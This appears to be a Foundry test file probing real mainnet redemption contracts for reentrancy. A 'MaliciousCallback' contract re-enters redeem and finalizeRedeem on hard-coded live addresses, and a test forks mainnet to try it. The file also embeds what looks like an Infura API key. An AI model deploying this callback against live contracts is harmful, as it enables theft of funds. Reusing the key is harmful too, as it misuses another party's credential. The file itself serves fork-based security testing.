// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MaliciousCallback {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address public owner;
    bool public attacking;

    constructor() {
        owner = msg.sender;
    }

    function onTokenTransfer(address, uint256, bytes calldata) external returns (bool) {
        if (!attacking) {
            attacking = true;
            RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, owner));
            attacking = false;
        }
        return true;
    }

    fallback() external payable {
        if (!attacking) {
            attacking = true;
            REDEMPTION_1.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            attacking = false;
        }
    }

    receive() external payable {}
}

contract CallbackExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionFlowForReentrancy() public view {
        console.log("=== ANALYZING REDEMPTION FLOW FOR REENTRANCY ===\n");
        
        bytes memory code = REDEMPTION_1.code;

        console.log("Looking for SSTORE/CALL order near RC.redeem:");
        console.log("\nAround offset 3627:");
        for (uint i = 3500; i < 3800 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
        }

        console.log("\nAround offset 3861:");
        for (uint i = 3750; i < 4000 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
        }
    }

    function test_TrySimulatedRedemption() public {
        console.log("=== SIMULATED REDEMPTION TEST ===\n");
        
        MaliciousCallback mal = new MaliciousCallback();
        deal(IAU, address(mal), 10000e18);

        vm.startPrank(address(mal));
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        console.log("Trying redeem as malicious contract:");
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }
        vm.stopPrank();
    }
}
